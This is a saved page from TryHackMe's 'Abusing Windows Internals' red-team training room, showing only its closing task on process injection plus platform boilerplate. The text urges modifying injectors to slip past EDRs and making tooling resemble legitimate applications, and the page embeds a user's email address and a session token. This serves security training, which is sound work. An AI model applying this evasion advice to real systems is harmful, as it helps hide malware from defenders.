                    <div id="collapse8" class="collapse " data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p>Process injection is an overarching technique that can be used in many varieties and is one of the most common cases of abusing Windows Internals.</p>
<p>It is important to note that as detection engineering and monitoring evolves injection techniques will need to evolve as well. Most of the techniques shown in this room will be detected by popular commercial EDRs but you can still easily modify your injectors to meet the cat and mouse game between the red and blue team.</p>
<p>When preparing to incorporate an injection technique into your own work or tools we advise that you use it as only a small section of a larger tool. Mixing and matching components of injection can also be very fruitful to attempt to make your tooling as close to a legitimate application as possible.</p>
<p>Add these techniques to your evasion toolbox and continue experimenting to identify what works best for the environment you are in.</p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                Read the above and continue learning!
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="8">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Question Done
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div></div>
</div>
<div id="room-simple-details"><div class="card cd-2 text-center mt-3"><div class="card-body"><p class="size-18">Created by <img class="avatar-tiny" src="./TryHackMe _ Abusing Windows Internals_files/af7feb2c43a2c7d5f111b98ccbd15048.png"> 
        <a class="green-link" href="https://tryhackme.com/p/tryhackme">tryhackme</a> and <img class="avatar-tiny" src="./TryHackMe _ Abusing Windows Internals_files/9e946af210ae86d6fbfda480d958b3fe.gif"> 
        <a class="green-link" href="https://tryhackme.com/p/Cryillic">Cryillic</a></p><p class="mb-0">Only subscribers can deploy virtual machines in this room! 
        Go to your <a href="https://tryhackme.com/profile">profile</a> page to subscribe (if you have not already). 6067 users are in here and this room is 475 days old.</p></div></div></div>

</div>
</div>
</div>
<div id="room-content-attackbox">
<div id="room-attackbox">
<div id="attackbox-machine-instance">
<div id="room-attackbox-loading"></div>
<div id="room-attackbox-vm-view"></div>
</div>
<div id="attackbox-machine-options">
<div class="d-flex">
<a target="_blank" id="room-attackbox-url" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="View in full screen"></a>
<div onclick="extendHourWebBasedVM(null)" class="hover-pointer" id="room-attackbox-extend" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Extend machines timer"><i class="fas fa-plus"></i></div>
<div onclick="terminateWebBasedVM(null)" class="hover-pointer" id="room-attackbox-terminate" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Terminate Machine"><i class="far fa-power-off"></i></div>
<div onclick="exitViewAttackBox()" class="hover-pointer" id="room-attackbox-exitview" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Exit split view"><i class="fas fa-minus"></i></div>
<div onclick="infoAttackBox()" class="hover-pointer faded" id="room-attackbox-info" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Machine Information"><i class="fas fa-info"></i></div>
<div class="d-flex" id="room-attackbox-tabs"></div>
</div>
<div id="room-attackbox-expire-text" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Time left until your AttackBox expires"></div>
</div>
</div>
<div class="modal fade" id="attackBoxInfoModal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header modal-light-gray">
<h5 class="modal-title m-auto">Web-Based Machine Information</h5>
</div>
<div class="modal-body">
<p>Use the web-based machine to attack other target machines you start on TryHackMe.</p>
<ul class="normalList text-gray mt-3 mb-4">
<li>Public IP: <code id="browser-machine-pubip" class="dark size-14"></code></li>
<li class="mt-1">Private IP: <code id="browser-machine-privip" class="dark size-14"></code> <span class="size-14">(Use this for your reverse shells)</span></li>
<li class="mt-1">Username: <code id="browser-username" class="dark size-14"></code></li>
<li class="mt-1">Password: <code id="browser-password" class="dark size-14"></code></li>
<li class="mt-1">Protocol: <code id="browser-protocol" class="dark size-14"></code></li>
</ul>
<hr class="hr-min">
<ul class="text-lgray mb-0">
<li class="mt-2">To copy to and from the browser-based machine, highlight the text and press <b>CTRL+SHIFT+C</b> <details><summary>or use the clipboard</summary><img src="./TryHackMe _ Abusing Windows Internals_files/clipboard.gif"></details></li>
<li class="mt-2">When accessing target machines you start on TryHackMe tasks, make sure you're using the correct IP (it <b>should not be</b> the IP of your AttackBox)</li>
</ul>
</div>
</div>
</div>
</div>
</div>
<div class="modal fade" id="award-modal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-body text-center">
<button type="button" class="close size-30 text-lgray" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
<div id="award-modal-badges"></div>
<p class="mb-0 text-lgray size-18">Complete the room to earn this badge</p>
</div>
</div>
</div>
</div>
<div class="modal fade" id="hint-modal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header modal-dark-blue">
<h5 class="modal-title"><i class="fal fa-lightbulb-on"></i> Question Hint</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body"></div>
</div>
</div>
</div>
<div class="modal fade" id="modal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header">
<h5 class="modal-title">...</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body text-center"></div>
<div class="modal-footer"></div>
</div>
</div>
</div>
<link rel="stylesheet" href="./TryHackMe _ Abusing Windows Internals_files/modal.css">
<div class="modal-design-green modal fade" id="roomCompleted" tabindex="-1" role="dialog" data-backdrop="static" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered" role="document">
<div class="modal-content" id="roomCompletedModalContent">
<div class="modal-body text-center">
<button type="button" class="close" id="closeRoomComplete" aria-label="Close">
<i class="fad fa-times-circle"></i>
</button>
<div class="icon-box">
<i class="fad fa-badge-check"></i>
</div>
<h3 class="text-accent mt-5">Congratulations</h3>
<p class="faded mt-1">You've completed the room! Share this with your friends: </p>
<h2 id="roomCompleted-share"></h2>
<div id="ticket-info"></div> 
<p class="faded mt-1" id="roomFeedbackBtn">
<small>
<button class="bg-white border-0">Leave
feedback</button>
</small>
</p>
<form method="post" action="https://tryhackme.com/feedback" id="roomFeedbackForm" class="d-none mt-3">
<input type="hidden" name="_csrf" value="loMRjnC4-40TEUPX701a_WeQartAWkmkJcpY">
<input type="hidden" name="roomCode" value="abusingwindowsinternals">
<input type="hidden" name="type" value="rooms">
<input type="hidden" name="redirect" value="json">
<div class="form-group">
<label class="mb-0" for="like">What do you like about the room?</label>
<textarea type="text" name="like" id="like" class="form-control"></textarea>
</div>
<div class="form-group">
<label class="mb-0" for="dislike">What don't you like about the room?</label>
<textarea type="text" name="dislike" id="dislike" class="form-control"></textarea>
</div>
<div class="form-group">
<label class="mb-0" for="details">Please send your suggestions, ideas and comments!</label>
<textarea id="details" type="text" name="details" class="form-control" style="padding: 5px;"></textarea>
</div>
<button type="submit" id="submitBtn" class="btn btn-success">Send Feedback</button>
</form>
<p class="mt-2 mb-0" id="formMessage"></p>
</div>
</div>
</div>
<script>
    function dismissRoomCompleteModal() {
      $('#roomCompleted').modal('hide');

      const shouldSeeReferralModal = ""
      if (shouldSeeReferralModal) {
        $('#unlockCreditModal').modal('show');

        referralModalEvent('view');
      }
    }

    document.getElementById('closeRoomComplete').addEventListener('click', dismissRoomCompleteModal)
  </script>
</div>
<script src="./TryHackMe _ Abusing Windows Internals_files/roomFeedback.js"></script>
<div class="modal fade" id="roomStartAttackboxModal" tabindex="-1" role="dialog" aria-hidden="true" data-backdrop="static" data-keyboard="false">
<div class="modal-dialog modal-dialog-centered" role="document">
<div class="modal-content">
<div class="modal-header modal-dark-blue">
<h5 class="modal-title m-auto">To access this machine, you need to either</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close" style="position: absolute; right: 10px; top: 0; font-size: 30px;">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body text-center">
<div class="row vertical-align-custom mb-0">
<div class="col-sm-5 pr-0">
<p class="size-18 bold">Use a VPN</p>
<p>Connect to our network via a VPN</p>
<a target="_blank" href="https://tryhackme.com/access"><button type="button" class="btn btn-light">See Instructions</button></a>
</div>
<div class="col-sm-2 size-24">
or
</div>
<div class="col-sm-5 pl-0">
<p class="size-18 bold">Use the AttackBox</p>
<p>Use a web-based attack machine <span class="size-12">(recommended)</span></p>
<button type="button" onclick="$(&#39;#roomStartAttackboxModal&#39;).modal(&#39;toggle&#39;); startAttackBox({startingMsg: false, tutorial: true})" class="btn btn-hgreen">Start AttackBox</button>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="modal-design-green modal fade" id="expireSoon" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered modal-sm" role="document">
<div class="modal-content">
<div class="modal-body text-center">
<h1><i class="text-warning fad fa-exclamation-triangle"></i></h1>
<h3 class="text-warning">Expiring Soon</h3>
<p class="faded mt-3 mb-0">Your machine is going to expire soon. Close this and add an hour to stop it from terminating!</p>
</div>
<div class="modal-footer">
<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<div class="modal-design-green modal fade" id="terminatedMachine" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered modal-sm" role="document">
<div class="modal-content">
<div class="modal-body text-center">
<h1><i class="text-danger fad fa-exclamation-triangle"></i></h1>
<h3 class="text-danger">Expired Machine</h3>
<p class="faded mt-3 mb-0">Your machine has expired and terminated.</p>
</div>
<div class="modal-footer">
<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<div class="modal-design-green modal fade" id="machineDeployModal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered modal-lg" role="document">
<div class="modal-content">
<div class="modal-header modal-dark-blue text-center p-3">
<h4 class="mb-0 m-auto">How to access machines</h4>
<button type="button" class="close modal-close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body text-center">
<p class="size-18 faded">Now you've started your machine, to access it you need to either</p>
<div class="row mb-0">
<div class="col-sm-6">
<img src="./TryHackMe _ Abusing Windows Internals_files/connect_openvpn_short.png">
<p class="mt-2 mb-0 faded">Download your VPN configuration file and import it into a OpenVPN client</p>
</div>
<div class="col-sm-6">
<img src="./TryHackMe _ Abusing Windows Internals_files/connect_kali_short.png">
<p class="mt-2 mb-0 faded">Control a web-based machine with everything you need, all from inside your browser</p>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="modal fade" id="roomAlertModal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered" role="document">
<div class="modal-content">
<div class="modal-header modal-dark-blue">
<h5 class="modal-title" id="roomAlertModalTitle"></h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body" id="roomAlertModalBody"></div>
<div class="modal-footer">
<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<div class="modal fade" id="resetUserProgressModal" role="dialog">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header">
<h5 class="modal-title">Reset Your Progress</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body">
<div><span class="text-danger"><i class="fas fa-exclamation-triangle"></i> Warning</span> You will keep your points but all your answers in this room will be erased.</div>
</div>
<div class="modal-footer">
<button type="button" class="btn btn-danger" onclick="resetProgress()">Yes, please!</button>
</div>
</div>
</div>
</div>
<div class="modal fade" id="cloudEnvInfoModal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered modal-lg" role="document">
<div class="modal-content">
<div class="modal-header  modal-dark-blue">
<h5 class="modal-title">Cloud Information</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body">
<ul class="nav nav-tabs">
<li class="nav-item pr-2">
<a class="nav-link active" data-toggle="tab" href="https://tryhackme.com/room/abusingwindowsinternals#env-tab">Environment</a>
</li>
<li class="nav-item">
<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/abusingwindowsinternals#creds-tab">Credentials</a>
</li>
</ul>
<div class="tab-content">
<div class="tab-pane active" id="env-tab"></div>
<div class="tab-pane" id="creds-tab"></div>
</div>
</div>
<div class="modal-footer" id="cloudEnvModalFooter">
</div>
</div>
</div>
</div>
<div class="modal fade" id="setNameModal" role="dialog">
<div class="modal-dialog modal-lg modal-dialog-centered" role="document">
<div class="modal-content">
<div class="modal-header modal-dark-blue">
<h5 class="modal-title">Generating Your Certificate</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body container">
<div class="row">
<div class="col-6">
<h5 class="bold">Hey there, what's your name?</h5>
<p class="text-secondary">
If you want your name to appear on your certificate, please fill the field below.
</p>
<div class="form-group">
<label>Full Name </label>
<input id="modal-cert-field-name" type="text" placeholder="John Wick" class="mb-4 form-control">
<input id="modal-cert-field-email" type="hidden" value="giftonpaul@karunya.edu.in">
</div>
</div>
<div class="col-6">
<h5 class="bold">You're here incognito? It's ok!</h5>
<p class="text-secondary">If you chose skip, your username will be used instead!</p>
</div>
</div>
<div class="row">
<div class="col-6">
<button type="button" class="btn btn-success float-right" id="modal-cert-generate" onclick="gen_cert(true)" disabled="">
Generate with my full name
</button>
</div>
<div class="col-6">
<button type="button" class="btn btn-primary float-right" id="modal-cert-skip" onclick="gen_cert(false)">
Generate with my username
</button>
</div>
</div>
</div>
</div>
</div>
</div>
<script src="./TryHackMe _ Abusing Windows Internals_files/certificateName.js"></script>
<div class="modal fade slideout-faq" id="roomSlideoutUnstuck" tabindex="-1" role="dialog">
<div class="modal-dialog modal-dialog-slideout" role="document">
<div class="modal-content">
<div class="modal-body">
<div id="slideout-links">
<div id="unstuck-video" class="unstuck-group" style="display: none;">
<div class="unstuck-icon"><i class="fas fa-play"></i></div>
<div class="unstuck-icon-text">Video Solution</div>
</div>
<div id="unstuck-writeups" class="unstuck-group" style="display: none;">
<div class="unstuck-icon"><i class="fas fa-pen-alt"></i></div>
<div class="unstuck-icon-text">Writeups</div>
</div>
<a id="unstuck-forum" target="_blank" class="clear-link unstuck-group" href="https://tryhackme.com/forum/thread/6242ca8b3e57f60055bf99eb">
<div class="unstuck-icon"><i class="fas fa-comments-alt"></i></div>
<div class="unstuck-icon-text">Forum Post</div>
</a>
<a href="https://help.tryhackme.com/en/collections/3601905-getting-started-with-tryhackme" target="_blank" class="clear-link unstuck-group">
<div class="unstuck-icon"><i class="fas fa-books"></i></div>
<div class="unstuck-icon-text">Knowledge Base</div>
</a>
<a href="https://discord.gg/DpBZz8y" target="_blank" class="clear-link unstuck-group">
<div class="unstuck-icon"><i class="fas fa-users"></i></div>
<div class="unstuck-icon-text">Ask Community</div>
</a>
</div>
</div>
</div>
</div>
</div>
<style>

    #navConnModal .modal-body{
        position: relative;
    }

    #nav-openvpn,
    #nav-attackbox {
        display: none;
    }

    #nav-openvpn .nav-pills .nav-link.active,
    #nav-openvpn .nav-pills .show>.nav-link {
        background-color: #ec8e3d;
        color: white;
    }
    #nav-openvpn .nav-link {
        color: #909090;
    }
    #nav-openvpn a,
    #nav-attackbox a {
        color: #ec8e3d;
    }

    #nav-openvpn code.dark {
        background-color: #7d400a;
        color: #fff;
    }

    #slideout-bk {
        display: none;
        padding: 10px 15px;
        opacity: 0.8;
        cursor: pointer;
    }

    #slideout-bk:hover {
        opacity: 1;
    }

    #slideout-conn-hideip {
        display: none;
        position: absolute;
        bottom: 8px;
        right: 8px;
        opacity: 0.7;
        cursor: pointer;
    }

    #slideout-conn-hideip:hover {
        opacity: 1;
    }

</style>
<div class="modal fade slideout-faq" id="navConnModal" tabindex="-1" role="dialog">
<div class="modal-dialog modal-dialog-slideout" role="document">
<div class="modal-content">
<div class="modal-body">
<div id="slideout-bk" class="noselect" onclick="showSlideoutConnOptions()"><i class="far fa-arrow-left mr-2"></i> Show Connection Options</div>
<div id="slideout-conn-options">
<div id="slideout-conn-header" class="text-center">
<img class="slideout-connect-img" src="./TryHackMe _ Abusing Windows Internals_files/tryhackme_connect.png">
<div id="slideout-conn-status" class="size-22">You are <span class="text-danger">disconnected</span></div>
</div>
<div class="m-3 text-center">
<p>To access target machines you need to either:</p>
<div class="row mb-3 faq-quicklinks text-left vertical-align-custom">
<div class="col-md-12 mb-3">
<a class="clear-link preventDefault" href="https://tryhackme.com/room/abusingwindowsinternals#" onclick="showAttackBoxSteps()">
<div class="card card-body">
<div class="row vertical-align-custom">
<div class="col col-2 text-center faq-quicklinks-icons">
<i class="far fa-laptop"></i>
</div>
<div class="col">
<div class="faq-quicklinks-title size-18">AttackBox</div>
<p class="faded mb-0">Use a browser-based attack machine</p>
</div>
</div>
</div>
</a>
</div>
<div class="col-md-12">
<a class="clear-link preventDefault" href="https://tryhackme.com/room/abusingwindowsinternals#" onclick="showVPNSteps()">
<div class="card card-body">
<div class="row vertical-align-custom">
<div class="col col-2 text-center faq-quicklinks-icons">
<i class="far fa-key"></i>
</div>
<div class="col">
<div class="faq-quicklinks-title size-18">OpenVPN</div>
<p class="faded mb-0">Connect to our network via a VPN</p>
</div>
</div>
</div>
</a>
</div>
</div>
</div>
</div>
<div id="faqCards" class="p-3">
<div id="nav-openvpn">
<div class="mb-3">
<a target="_blank" href="https://tryhackme.com/access"><i>View the dedicated OpenVPN access page for more information</i></a>
</div>
<div class="text-center">
<h4>What Operating System are you using?</h4>
<ul class="nav nav-pills mb-3 text-center" id="vpn-guide" style="display: flex; justify-content: center;">
<li class="nav-item m-3">
<a class="nav-link" data-toggle="pill" href="https://tryhackme.com/room/abusingwindowsinternals#pills-windows" role="tab" aria-controls="pills-windows" aria-selected="true"><i class="fab fa-windows mr-2"></i> Windows</a>
</li>
<li class="nav-item m-3">
<a class="nav-link active" data-toggle="pill" href="https://tryhackme.com/room/abusingwindowsinternals#pills-linux" role="tab" aria-controls="pills-linux" aria-selected="false"><i class="fab fa-linux mr-2"></i> Linux</a>
</li>
<li class="nav-item m-3">
<a class="nav-link" data-toggle="pill" href="https://tryhackme.com/room/abusingwindowsinternals#pills-macos" role="tab" aria-controls="pills-macos" aria-selected="false"><i class="fab fa-apple mr-2"></i> MacOS</a>
</li>
</ul>
<div class="tab-content text-left">
<div class="tab-pane fade" id="pills-windows" role="tabpanel">
<ol>
<li><a href="https://tryhackme.com/vpn/get-config">Download</a> your OpenVPN configuration pack.</li>
<li class="mt-2"><a target="_blank" href="https://openvpn.net/client-connect-vpn-for-windows/">Download</a> the OpenVPN GUI application.</li>
<li class="mt-2">Install the OpenVPN GUI application. Then open the installer file and follow the setup wizard.</li>
<li class="mt-2">Open and run the OpenVPN GUI application as Administrator.<br><img class="mt-2 mb-3" src="./TryHackMe _ Abusing Windows Internals_files/win_ran_admin.png"></li>
<li class="mt-2">The application will start running in the system tray. It's at the bottom of your screen, near the clock. Right click on the application and click <b>Import File</b>. <br><img class="mt-2 mb-3" src="./TryHackMe _ Abusing Windows Internals_files/win_import.png"></li>
<li class="mt-2">Select the configuration file you downloaded earlier.</li>
<li class="mt-2">Now right click on the application again, select your file and click Connect <br><img class="mt-2 mb-3" src="./TryHackMe _ Abusing Windows Internals_files/win_connect.png"></li>
</ol>
</div>
<div class="tab-pane fade show active" id="pills-linux" role="tabpanel">
<ol>
<li><a href="https://tryhackme.com/vpn/get-config">Download</a> your OpenVPN configuration pack.</li>
<li class="mt-2">Run the following command in your terminal: <code class="dark">sudo apt install openvpn</code></li>
<li class="mt-2">Locate the full path to your VPN configuration file (normally in your ~/Downloads folder).</li>
<li class="mt-2">Use your OpenVPN file with the following command: <code class="dark">sudo openvpn /path/to/file.ovpn</code></li>
</ol>
</div>
<div class="tab-pane fade" id="pills-macos" role="tabpanel">
<ol>
<li><a href="https://tryhackme.com/vpn/get-config">Download</a> your OpenVPN configuration pack.</li>
<li class="mt-2"><a href="https://openvpn.net/downloads/openvpn-connect-v2-macos.dmg">Download</a> OpenVPN for MacOS.</li>
<li class="mt-2">Install the OpenVPN GUI application, by opening the dmg file and following the setup wizard.<br><img width="250" class="mt-2 mb-3" src="./TryHackMe _ Abusing Windows Internals_files/mac_installer.png"></li>
<li class="mt-2">Open and run the OpenVPN GUI application.</li>
<li class="mt-2">The application will start running and appear in your top bar. Right click on the application and click <b>Import File -&gt; Local file</b>.<br><img class="mt-2 mb-3" src="./TryHackMe _ Abusing Windows Internals_files/mac_import.png"></li>
<li class="mt-2">Select the configuration file you downloaded earlier.</li>
<li class="mt-2">Right click on the application again, select your file and click connect.<br><img class="mt-2 mb-3" src="./TryHackMe _ Abusing Windows Internals_files/mac_connect.png"></li>
</ol>
</div>
</div>
<section class="text-left">
<a class="remove-underline" data-toggle="collapse" href="https://tryhackme.com/room/abusingwindowsinternals#havingProblems" role="button" aria-expanded="false" aria-controls="havingProblems">
<h5 class="mb-0 text-openvpn">Having Problems?</h5>
</a>
<div class="collapse" id="havingProblems">
<ul class="mt-2 mb-0">
<li>If you can access <a target="_blank" href="http://10.10.10.10/">10.10.10.10</a>, you're connected.</li>
<li>Downloading and getting a 404? Go the <a href="https://tryhackme.com/access">access</a> page and switch VPN servers.</li>
<li>Getting inline cert error? Go the <a href="https://tryhackme.com/access">access</a> page and switch VPN servers.</li>
<li>If you are using a virtual machine, you will need to run the VPN inside that machine.</li>
<li>Is the OpenVPN client running as root? <span class="size-14 faded">(On Windows, run OpenVPN GUI as administrator. On Linux, run with sudo)</span></li>
<li>Have you restarted your VM?</li>
<li>Is your OpenVPN up-to-date?</li>
<li>Only 1 OpenVPN connection is allowed. <span class="size-14 faded">(Run <code class="dark">ps aux | grep openvpn</code> - are there 2 VPN sessions running?)</span></li>
<li>Still having issues? Check our <a href="https://help.tryhackme.com/en/articles/6496029-openvpn-general-troubleshooting-detailed/">docs</a> out.</li>
</ul>
</div>
</section>
</div>
</div>
<div id="nav-attackbox">
<div class="text-center">
<h4>AttackBox</h4>
<p class="faded">Use your own web-based linux machine to access machines on TryHackMe</p>
</div>
<p>To start your AttackBox in the room, click the <a class="preventDefault" onclick="showAttackBoxBtnFromSlideout()" href="https://tryhackme.com/room/abusingwindowsinternals#">Start AttackBox</a> button. Your private machine will take 2 minutes to start.</p>
<p>Free users get 1 free AttackBox hour. <a class="hacker-green" href="https://tryhackme.com/why-subscribe">Subscribed</a> users get more powerful machines with unlimited deploys.</p>
</div>
</div>
<span id="slideout-conn-hideip" onclick="hideNavConnIP()" style="display: none;">Hide IP</span>
</div>
</div>
</div>
</div>
<script>

    const navConnVPNEl = document.querySelector('#nav-openvpn')
    const navConnAttackBoxEl = document.querySelector('#nav-attackbox')
    const navConnOptions = document.querySelector('#slideout-conn-options')

    const navConnBkBtn = document.querySelector('#slideout-bk')

    function showVPNSteps() {
        navConnOptions.style.display = 'none'
        navConnVPNEl.style.display = 'block'
        navConnBkBtn.style.display = 'block'
    }

    function showAttackBoxSteps() {
        navConnOptions.style.display = 'none'
        navConnAttackBoxEl.style.display = 'block'
        navConnBkBtn.style.display = 'block'
    }

    function showSlideoutConnOptions() {
        navConnVPNEl.style.display = 'none'
        navConnAttackBoxEl.style.display = 'none'
        navConnBkBtn.style.display = 'none'
        navConnOptions.style.display = 'block'
    }

    function showAttackBoxBtnFromSlideout() {
        $('#navConnModal').modal('toggle')
        setTimeout(function() {
            showAttackBoxBtnIntro()
        }, 100)   
    }

  </script>
</div>
<script src="./TryHackMe _ Abusing Windows Internals_files/notify.js"></script>
<script src="./TryHackMe _ Abusing Windows Internals_files/api-requests.js"></script>
<script src="./TryHackMe _ Abusing Windows Internals_files/events.js"></script>
<script src="./TryHackMe _ Abusing Windows Internals_files/underscore-min.js"></script>
<script src="./TryHackMe _ Abusing Windows Internals_files/apexcharts.min.js"></script> 
<script src="./TryHackMe _ Abusing Windows Internals_files/chart.js"></script>
<script src="./TryHackMe _ Abusing Windows Internals_files/expire.js"></script>
<script src="./TryHackMe _ Abusing Windows Internals_files/sockets.js"></script>
<script src="./TryHackMe _ Abusing Windows Internals_files/faqSearch.js"></script>
<script src="./TryHackMe _ Abusing Windows Internals_files/certificate.js"></script>
<script src="./TryHackMe _ Abusing Windows Internals_files/utils.js"></script>
<script src="./TryHackMe _ Abusing Windows Internals_files/roomSpecific.js"></script>
<script src="./TryHackMe _ Abusing Windows Internals_files/confetti.js"></script>
<script src="./TryHackMe _ Abusing Windows Internals_files/videos.js"></script>
<script src="./TryHackMe _ Abusing Windows Internals_files/intro.js"></script>
<script src="./TryHackMe _ Abusing Windows Internals_files/prism.js"></script>
<script src="./TryHackMe _ Abusing Windows Internals_files/asciinema-player.js"></script>
<script src="./TryHackMe _ Abusing Windows Internals_files/magnific-popup.min.js"></script>
<script src="./TryHackMe _ Abusing Windows Internals_files/introjsLogic.js"></script>
<script src="./TryHackMe _ Abusing Windows Internals_files/logic.js"></script>
<script src="./TryHackMe _ Abusing Windows Internals_files/tasks.js"></script>
<script src="./TryHackMe _ Abusing Windows Internals_files/connection-status.js"></script>
<script src="./TryHackMe _ Abusing Windows Internals_files/glossary.js"></script>
<script src="./TryHackMe _ Abusing Windows Internals_files/room-mymachine.js"></script>
<script src="./TryHackMe _ Abusing Windows Internals_files/heartbeat.js" defer=""></script>
<script>

    let height
    $(window).scroll(function () { /* Function to make IP information sticky. */
      if (height == undefined || height < 30) {
        height = ($('#instance-info').offset().top)
      }
      let scroll = $(window).scrollTop()
      if (((scroll >= (height + 150))) && height > 30) {
        $("#instance-info").addClass('instance-sticky')
      } else if ((scroll <= (height))) {
        $("#instance-info").removeClass("instance-sticky")
      }
    })

    const csrfToken = "loMRjnC4-40TEUPX701a_WeQartAWkmkJcpY"
    $.ajaxSetup({ headers: { 'CSRF-Token': csrfToken } }) // all $.post headers include token (needs csrfProtection middleware)

    const roomCode = "abusingwindowsinternals"
    const simpleRoom = true 
    const events = {"tickets":false}

    let userObj = { 
      subscribed: 1,
      splitScreen: true,
      path: "redteaming",
      tutorial: {
        rooms: true,
        attackbox: true,
        staticsite: true
      },
      experiments:  JSON.parse(`{"onboardingAchievement":{},"scheduler":{"startDate":"2023-06-14T13:38:51.108Z"},"showEasyPath":true}`),
    }

    const roomSettings = {
      remAttackBoxBtn : false
    };

    const heartbeatInterval = 30;

    const cloudEnabled = false 
    let cloudObj

    initRoom()
    checkVideoTab()
    if(!simpleRoom) showChart(roomCode)

    checkRoomAwards(roomCode)

    getRoomVotes()

    displayStreakFreezeAwardedFromMemory();
    
    window.addEventListener('load', function () {
      introjsInit(roomCode)
    })

  </script>


<svg id="SvgjsSvg1001" width="2" height="0" xmlns="http://www.w3.org/2000/svg" version="1.1" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:svgjs="http://svgjs.dev" style="overflow: hidden; top: -100%; left: -100%; position: absolute; opacity: 0;"><defs id="SvgjsDefs1002"></defs><polyline id="SvgjsPolyline1003" points="0,0"></polyline><path id="SvgjsPath1004" d="M0 0 "></path></svg><div id="E3D9AB95-AFC2-066F-C0E6-72E5F0509264"></div><iframe id="_hjSafeContext_4673847" title="_hjSafeContext" tabindex="-1" aria-hidden="true" src="./TryHackMe _ Abusing Windows Internals_files/saved_resource.html" style="display: none !important; width: 1px !important; height: 1px !important; opacity: 0 !important; pointer-events: none !important;"></iframe><iframe id="intercom-frame" style="position: absolute !important; opacity: 0 !important; width: 1px !important; height: 1px !important; top: 0 !important; left: 0 !important; border: none !important; display: block !important; z-index: -1 !important; pointer-events: none;" aria-hidden="true" tabindex="-1" title="Intercom" src="./TryHackMe _ Abusing Windows Internals_files/saved_resource(1).html"></iframe><div class="intercom-lightweight-app"><div class="intercom-lightweight-app-launcher intercom-launcher" role="button" tabindex="0" aria-label="Open Intercom Messenger" aria-live="polite"><div class="intercom-lightweight-app-launcher-icon intercom-lightweight-app-launcher-icon-open"><img src="./TryHackMe _ Abusing Windows Internals_files/9e0f012f15b6fc981dde2f1f5198d728.png" alt="" class="intercom-lightweight-app-launcher-custom-icon-open"></div><div class="intercom-lightweight-app-launcher-icon intercom-lightweight-app-launcher-icon-minimize"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path fill-rule="evenodd" clip-rule="evenodd" d="M18.601 8.39897C18.269 8.06702 17.7309 8.06702 17.3989 8.39897L12 13.7979L6.60099 8.39897C6.26904 8.06702 5.73086 8.06702 5.39891 8.39897C5.06696 8.73091 5.06696 9.2691 5.39891 9.60105L11.3989 15.601C11.7309 15.933 12.269 15.933 12.601 15.601L18.601 9.60105C18.9329 9.2691 18.9329 8.73091 18.601 8.39897Z" fill="white"></path>
</svg>
</div></div><style id="intercom-lightweight-app-style" type="text/css">
  @keyframes intercom-lightweight-app-launcher {
    from {
      opacity: 0;
      transform: scale(0.5);
    }
    to {
      opacity: 1;
      transform: scale(1);
    }
  }

  @keyframes intercom-lightweight-app-gradient {
    from {
      opacity: 0;
    }
    to {
      opacity: 1;
    }
  }

  @keyframes intercom-lightweight-app-messenger {
    0% {
      opacity: 0;
